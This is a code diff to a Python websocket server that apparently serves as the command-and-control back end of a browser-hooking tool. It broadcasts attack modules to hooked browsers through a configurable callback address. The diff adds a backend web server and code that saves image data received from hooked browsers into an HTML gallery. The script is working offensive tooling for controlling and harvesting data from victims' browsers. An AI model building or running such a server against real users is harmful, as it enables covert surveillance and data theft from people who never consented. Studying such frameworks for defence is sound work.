@@ -7,6 +7,7 @@ from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
 from functools import partial
 import time
 import os
+import sys
 from prompt_toolkit import PromptSession
 from prompt_toolkit import print_formatted_text
 import argparse
@@ -29,6 +30,13 @@ def start_web_server(ip,port):
     print(f"\nHosting website at: {ip}:{port}.")
     server.serve_forever()
 
+def start_backend(ip,port):
+    handler = partial(QuietHandler, directory="backend")
+    server = ThreadingHTTPServer((ip,port), handler)
+    print(f"\nHosting backend at: {ip}:{port}.")
+    print("!!! KEEP BACKEND LOCAL !!!")
+    server.serve_forever()
+
 CLIENTS = set()
 
 async def conncted():
@@ -45,8 +53,15 @@ async def msg(timeout):
         try:
             for client in CLIENTS:
                 m = await asyncio.wait_for(client.recv(), timeout=int(timeout))
+                if m[0:10] == "data:image":
+                    print_formatted_text(f"Image data received saving to backend/images.html as <img>")
+                    with open("backend/images.html", "a") as images:
+                        image = f"<img src='{m}'\\>"
+                        images.write(image)
+                        images.close()
 
-                print_formatted_text(f"Received: {m}")
+                else:
+                    print_formatted_text(f"Received: {m}")
 
         except websockets.exceptions.ConnectionClosed:
             pass
@@ -83,7 +98,7 @@ async def broadcast(timeout):
             print("Moubles:")
             for i in range(0, len(script_names), columns):
                 row = script_names[i:i + columns]    
-                print("".join(script.ljust(width) for script in row))
+                print("\t","".join(script.ljust(width) for script in row))
             print("\n")
             cmd = ""
 
@@ -101,7 +116,7 @@ async def broadcast(timeout):
         else:
             message = cmd
         if message in {"quit", "exit"}:
-            break
+            sys.exit()
         if message == '':
             message = "" 
         await asyncio.gather(
@@ -135,7 +150,10 @@ if __name__ == '__main__':
     parser.add_argument('-ws','--web_ip', default="127.0.0.1", help="website IP to host at.")
     parser.add_argument('-wp','--web_port', type=int, default=8000, help="Website port.")
     parser.add_argument('-cb', '--callback', default="ws://127.0.0.1:9000", help="Browser hook call back adress. EX: ws://<Server IP>:<Server port>")
-    parser.add_argument('-t', '--timeout', type=int, default=2, help="Time to wait for request form browsers.")
+    parser.add_argument('-t', '--timeout', type=int, default=5, help="Time to wait for request form browsers.")
+    parser.add_argument('-bs', '--backend_ip', default="127.0.0.1", help="backend IP.")
+    parser.add_argument('-bp', '--backend_port', type=int, default=5000, help="backend port.")
+
     args = parser.parse_args()
 
     ip = args.server_ip
@@ -144,6 +162,8 @@ if __name__ == '__main__':
     web_port = args.web_port
     cal_bck_addr = args.callback
     timeout = args.timeout
+    be_ip = args.backend_ip
+    be_port = args.backend_port
 
     if (cal_bck_addr[0:3] == "ws:"):
         pass
@@ -161,5 +181,6 @@ if __name__ == '__main__':
         exit()
 
     threading.Thread(target=start_web_server, args=(web_ip,int(web_port)),daemon=True).start()
+    threading.Thread(target=start_backend, args=(be_ip,int(be_port)),daemon=True).start()
     time.sleep(3)
     asyncio.run(main(ip,int(port),timeout))
